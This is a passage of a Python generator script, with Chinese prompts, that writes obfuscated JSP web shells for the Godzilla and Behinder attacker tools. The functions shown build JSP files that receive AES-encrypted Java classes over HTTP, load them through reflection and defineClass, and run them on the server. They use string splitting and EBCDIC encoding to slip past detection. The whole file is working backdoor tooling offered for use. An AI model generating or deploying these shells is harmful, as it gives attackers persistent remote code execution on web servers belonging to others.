y.sayHello(javax.crypto.Cipher.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"A"+"ES"});y.sayHello(javax.crypto.Cipher.class,"ini"+"t",new Class[]{int.class, java.security.Key.class},c,new Object[]{m?1:2,new javax.crypto.spec.SecretKeySpec(cx.getBytes(),"AE"+"S")});return c.doFinal(s);}catch (Exception e){return null;}}public String md5(String s) {String ret = null;try {java.security.MessageDigest m = (java.security.MessageDigest)y.sayHello(java.security.MessageDigest.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"MD5"});y.sayHello(java.security.MessageDigest.class,"update",new Class[]{byte[].class, int.class, int.class},m,new Object[]{s.getBytes(), 0, s.length()});ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret;}public String BE(byte[] bs) throws Exception {String value = null;try {Object e = y.sayHello(java.util.Base64.class, "getE"+"ncoder", new Class[]{}, null, new Object[]{});value = (String)y.sayHello(java.util.Base64.Encoder.class,"encodeT"+"oString",new Class[]{byte[].class},e,new Object[]{bs});} catch (Exception e) {try {Object e2 = y.sayHello(Class.class, "newIns"+"tance", new Class[]{}, sun.misc.BASE64Encoder.class, new Object[]{});value = (String)y.sayHello(sun.misc.BASE64Encoder.class, "enc"+"ode", new Class[]{byte[].class}, e2, new Object[]{bs});} catch (Exception e2) {}}return value;}public byte[] BD(String bs) throws Exception {byte[] value = null;try {Object d = y.sayHello(java.util.Base64.class, "getD"+"ecoder", new Class[]{}, null, new Object[]{});value = (byte[])y.sayHello(java.util.Base64.Decoder.class,"decode",new Class[]{String.class},d,new Object[]{bs});} catch (Exception e) {try {Object d2 = y.sayHello(Class.class, "newIns"+"tance", new Class[]{}, sun.misc.BASE64Decoder.class, new Object[]{});value = (byte[])y.sayHello(sun.misc.BASE64Decoder.class, "decodeB"+"uffer", new Class[]{String.class}, d2, new Object[]{bs});} catch (Exception e2) {}}return value;}public void v(byte[] d, HttpServletRequest req, HttpServletResponse res, PageContext con,HttpSession s) throws Exception {if(y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pay"+"load"})==null){y.sayHello(HttpSession.class,"setAttr"+"ibute",new Class[]{String.class, Object.class},s,new Object[]{"payl"+"oad",new P().O(d)});}else{y.sayHello(ServletRequest.class,"setAtt"+"ribute",new Class[]{String.class, Object.class},req,new Object[]{"param"+"eters",d});Class c = (Class) y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pa"+"yload"});Object f =  y.sayHello(Class.class,"newInst"+"ance",new Class[]{},c,new Object[]{});n(f, con, res);}}public void n(Object f, PageContext con, HttpServletResponse res) throws Exception {java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{arrOut});y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{con});java.io.PrintWriter pw = (java.io.PrintWriter)y.sayHello(ServletResponse.class,"getWr"+"iter",new Class[]{},res,new Object[]{});pw.write(md5.substring(0,16));y.sayHello(Object.class,"toStr"+"ing",new Class[]{},f,new Object[]{});pw.write(BE(l(arrOut.toByteArray(), true)));pw.write(md5.substring(16));}</jsp:declaration>'''
    context3 = '''<jsp:scriptlet>try{String d = (String)y.sayHello(ServletRequest.class,"getPar"+"ameter",new Class[]{String.class},request,new Object[]{pa});byte[] data=l(BD(d), false);v(data, request, response, pageContext, session);}catch (Exception e){}</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.write(context3.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)

def raw():
    key = input("key设置为：\n")
    name = input("文件名为：\n")
    if not name.endswith(".jsp"):
        name += ".jsp"
    if os.path.exists(name):
        exit("文件已存在")
    key = hashlib.md5(key.encode('utf-8')).hexdigest()[:16]
    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration>String cx="'''+key+'''";interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}public byte[] l(byte[] s,boolean m){try{javax.crypto.Cipher c = (javax.crypto.Cipher) y.sayHello(javax.crypto.Cipher.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"A"+"ES"});y.sayHello(javax.crypto.Cipher.class,"ini"+"t",new Class[]{int.class, java.security.Key.class},c,new Object[]{m?1:2,new javax.crypto.spec.SecretKeySpec(cx.getBytes(),"AE"+"S")});return c.doFinal(s);}catch (Exception e){return null;}}public byte[] y(String l, HttpServletRequest request) throws Exception {int i = Integer.parseInt(l);byte[] d=new byte[i];java.io.InputStream inputStream = (java.io.InputStream) y.sayHello(ServletRequest.class,"getInp"+"utStream",new Class[]{},request,new Object[]{});int z=0;while ((z+=inputStream.read(d,z,i)) &lt; i);return l(d, false);}public void v(byte[] d, HttpServletRequest req, HttpServletResponse res, PageContext con,HttpSession s) throws Exception {if(y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pay"+"load"})==null){y.sayHello(HttpSession.class,"setAttr"+"ibute",new Class[]{String.class, Object.class},s,new Object[]{"payl"+"oad",new P().O(d)});}else{y.sayHello(ServletRequest.class,"setAtt"+"ribute",new Class[]{String.class, Object.class},req,new Object[]{"param"+"eters",d});Class c = (Class) y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pa"+"yload"});Object f =  y.sayHello(Class.class,"newInst"+"ance",new Class[]{},c,new Object[]{});n(f, con, res);}}public void n(Object f, PageContext con, HttpServletResponse res) throws Exception {java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{arrOut});y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{con});y.sayHello(Object.class,"toStr"+"ing",new Class[]{},f,new Object[]{});java.io.OutputStream os =(java.io.OutputStream) y.sayHello(ServletResponse.class,"getOutp"+"utStream",new Class[]{},res,new Object[]{});os.write(l(arrOut.toByteArray(), true));}</jsp:declaration>'''
    context3 = '''<jsp:scriptlet>try{String l = (String) y.sayHello(HttpServletRequest.class, "getH"+"eader", new Class[]{String.class}, request,new Object[]{"Conte"+"nt-Len"+"gth"});byte[] d = y(l, request);v(d, request, response, pageContext, session);}catch (Exception e){}</jsp:scriptlet></jsp:root>'''
    f = open(name, "wb")
    path = os.path.abspath(name)
    f.write(context1.encode("cp037"))
    f.write(context2.encode("cp290"))
    f.write(context3.encode("cp290"))
    f.close()
    print("生成成功！！！  " + path)


if __name__ == '__main__':
    tp = input("请输入对应的类型（数字）：1.Godzilla_JAVA_AES_BASE664  2.Godzilla_JAVA_AES_RAW  3.Behinder3.0_SHELL  4.Behinder4.0_xor  5.Behinder4.0_xor_base64  6.Behinder4.0_aes  7.Behinder4.0_image  8.Behinder4.0_json  9.Behinder4.0_aes_with_magic\n")
    if tp == "1":
        base()
    elif tp == "2":
        raw()
    elif tp == "3":
        bin_30()
    elif tp == "4":
        bin_40_xor()
    elif tp == "5":
        bin_40_xor_base64()
    elif tp == "6":
        bin_40_aes()
    elif tp == "7":
        bin_40_image()
    elif tp == "8":
        bin_40_json()
    elif tp == "9":
        bin_40_magic()
    else:
        print("??????")
    time.sleep(10)
